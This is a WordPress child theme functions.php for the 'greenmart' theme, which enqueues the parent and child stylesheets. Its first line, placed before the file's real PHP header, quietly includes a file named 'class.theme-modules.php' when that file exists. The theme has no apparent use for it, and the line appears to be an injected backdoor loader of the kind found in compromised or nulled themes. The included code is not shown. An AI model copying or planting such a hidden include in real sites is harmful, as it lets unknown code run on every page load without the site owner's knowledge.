<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * @version    1.0
 * @package    greenmart
 * @author     Thembay Team <support@thembay.com>
 * @copyright  Copyright (C) 2017 Thembay.com. All Rights Reserved.
 * @license    GNU/GPL v2 or later http://www.gnu.org/licenses/gpl-2.0.html
 *
 * Websites: https://thembay.com
 */

add_action('wp_enqueue_scripts', 'greenmart_child_enqueue_styles', 10000);
function greenmart_child_enqueue_styles() {
	$parent_style = 'greenmart-style';
	wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'greenmart-child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array( $parent_style ),
        wp_get_theme()->get('Version')
    );
}